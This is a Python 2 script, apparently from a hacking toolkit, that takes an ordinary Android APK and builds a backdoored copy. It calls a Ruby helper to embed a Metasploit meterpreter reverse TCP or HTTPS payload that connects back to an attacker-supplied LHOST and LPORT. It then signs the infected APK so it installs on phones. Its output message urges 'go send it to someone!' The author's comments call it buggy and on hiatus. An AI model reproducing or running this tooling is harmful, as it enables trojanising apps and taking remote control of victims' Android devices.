#!/usr/bin/env python
# coding=UTF-8

#Coding this is placed on hiatus because somehow the stupid thing is bugged.
#It's probably because of a flaw in the ruby script itself
#The maker expected the user to navigate to the same directory, and then drop all the files into it and run the script
import os
import socket
import operator
from termcolor import colored
import sys
sys.stdout.write("\x1b[8;{rows};{cols}t".format(rows=64, cols=200)) # sets window to full screen

os.system('cat /root/ArmsCommander/banner_APK_malware_injection.txt')

class parameters_APK_injector(object):
    def __init__( #remember to always put double underscores around init
        self,
        path_Original_APK,
        LHOST,
        LPORT
    ):
        self.path_Original_APK = path_Original_APK
        self.LHOST = LHOST
        self.LPORT = LPORT

    @classmethod
    def from_input(cls):
        return cls(
            str(raw_input("Enter the path to the original APK file: ")),
            str(raw_input("Enter LHOST (Your public IP or DNS): ")),
            str(raw_input("Enter LPORT (Your port that you are listening on with your handler): "))
        )


def inject_APK():

    opt_List = [
        '\n\t#1. INLINE, android/meterpreter_reverse_tcp',
        '#2. STAGED, android/meterpreter/reverse_tcp',
        '#3. INLINE, android/meterpreter_reverse_https',
        '#4. STAGED, android/meterpreter/reverse_https'
    ]
    user_Input = parameters_APK_injector.from_input()

    print ("\n\t".join(opt_List))

    string_List = [
            'android/meterpreter_reverse_tcp',
            'android/meterpreter/reverse_tcp',
            'android/meterpreter_reverse_https',
            'android/meterpreter/reverse_https'
    ]

    opt_Choice = str(raw_input("Enter a CHOICE of PAYLOAD to use: "))
# Todos
# add the entire command string
    if opt_Choice == "1":
        payload_String = string_List[0]
        cmd_String = "ruby /root/ArmsCommander/apk-embed-payload.rb {0} -p {1} LHOST={2} LPORT={3}".format(
            user_Input.path_Original_APK,
            payload_String,
            user_Input.LHOST,
            user_Input.LPORT
        )
        print colored(cmd_String,'red','on_white')
        os.system(cmd_String)
        # old_file_string = user_Input.path_Original_APK
        # #backdoored_Append = "_backdoored.apk"
        # new_file_string = ((old_file_string).join."_backdoored.apk")
        # print colored('Infected malware saved as %s, you need to sign it to make it installable on Android devices','red','on_white') % new_file_string
        main()
    elif opt_Choice == "2":
        payload_String = string_List[1]
        cmd_String = "ruby /root/ArmsCommander/apk-embed-payload.rb {0} -p {1} LHOST={2} LPORT={3}".format(
            user_Input.path_Original_APK,
            payload_String,
            user_Input.LHOST,
            user_Input.LPORT
        )
        print colored(cmd_String,'red','on_white')
        os.system(cmd_String)
        # old_file_string = user_Input.path_Original_APK
        # #backdoored_Append = "_backdoored.apk"
        # new_file_string = ((old_file_string).join."_backdoored.apk")
        # print colored('Infected malware saved as %s, you need to sign it to make it installable on Android devices','red','on_white') % new_file_string
        main()
    elif opt_Choice == "3":
        payload_String = string_List[2]
        cmd_String = "ruby /root/ArmsCommander/apk-embed-payload.rb {0} -p {1} LHOST={2} LPORT={3}".format(
            user_Input.path_Original_APK,
            payload_String,
            user_Input.LHOST,
            user_Input.LPORT
        )
        print colored(cmd_String,'red','on_white')
        os.system(cmd_String)
        # old_file_string = user_Input.path_Original_APK
        # #backdoored_Append = "_backdoored.apk"
        # new_file_string = ((old_file_string).join."_backdoored.apk")
        # print colored('Infected malware saved as %s, you need to sign it to make it installable on Android devices','red','on_white') % new_file_string
        main()
    elif opt_Choice == "4":
        payload_String = string_List[3]
        cmd_String = "ruby /root/ArmsCommander/apk-embed-payload.rb {0} -p {1} LHOST={2} LPORT={3}".format(
            user_Input.path_Original_APK,
            payload_String,
            user_Input.LHOST,
            user_Input.LPORT
        )
        print colored(cmd_String,'red','on_white')
        os.system(cmd_String)
        # old_file_string = user_Input.path_Original_APK
        # #backdoored_Append = "_backdoored.apk"
        # new_file_string = ((old_file_string).join."_backdoored.apk")
        # print colored('Infected malware saved as %s, you need to sign it to make it installable on Android devices','red','on_white') % new_file_string
        main()
    else:
        print colored('You have entered a invalid option','red','on_white')
        inject_APK()
    return
def sign_Java():
    path_Infected_APK = str(raw_input("Enter the PATH of the RECOMPILED APK: "))
    output_Signed_APK = str(raw_input("Enter the OUTPUT FILE you want as a APK: "))

    cmd_String = "java -jar /root/ArmsCommander/signapk.jar /root/ArmsCommander/certificate.pem /root/ArmsCommander/key.pk8 {0} {1}".format(
        path_Infected_APK,
        output_Signed_APK
    )
    print colored(cmd_String,'red','on_white')
    os.system(cmd_String)
    print colored('Infected Malware Saved as %s, go send it to someone!','red','on_white') % output_Signed_APK
    main()
    return
def main():
    # opt list
    opt_List = [
        '\n\t#1. Generate a payload and inject into a APK copied file',
        '#2. Sign the java app to make it installable in Android'
    ]

    print ("\n\t".join(opt_List))
    opt_Choice = str(raw_input("Enter a OPTION: "))
    # choose a option either
    # 1. Generate a payload and inject into a APK copied file
    if opt_Choice == "1":
        inject_APK()
    elif opt_Choice == "2":
        sign_Java()
        return
    else:
        print colored('You have entered a invalid option','red','on_white')
        main()
    # 2. Sign the java app to make it installable in Android

    #if and elif function
    return
main()
